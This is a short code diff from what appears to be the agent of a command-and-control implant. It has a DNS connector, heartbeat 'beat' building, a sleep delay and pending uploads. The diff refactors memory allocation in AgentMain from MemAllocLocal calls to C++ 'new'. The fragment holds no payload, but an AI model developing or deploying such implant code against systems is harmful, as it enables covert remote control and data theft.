@@ -254,13 +254,8 @@ void AgentMain()
 	if (!ApiLoad())
 		return;
 
-	g_Agent = (Agent*)MemAllocLocal(sizeof(Agent));
-	*g_Agent = Agent();
-
-	g_Connector = (ConnectorDNS*)MemAllocLocal(sizeof(ConnectorDNS));
-	if (!g_Connector)
-		return;
-	*g_Connector = ConnectorDNS();
+	g_Agent = new Agent();
+	g_Connector = new ConnectorDNS();
 
 	ULONG beatSize = 0;
 	BYTE* beat = g_Agent->BuildBeat(&beatSize);
@@ -268,8 +263,7 @@ void AgentMain()
 	if (!g_Connector->SetConfig(g_Agent->config->profile, beat, beatSize, g_Agent->config->sleep_delay))
 		return;
 
-	Packer* packerOut = (Packer*)MemAllocLocal(sizeof(Packer));
-	*packerOut = Packer();
+	Packer* packerOut = new Packer();
 	packerOut->Pack32(0);
 
 	BYTE* pendingUpload = NULL;
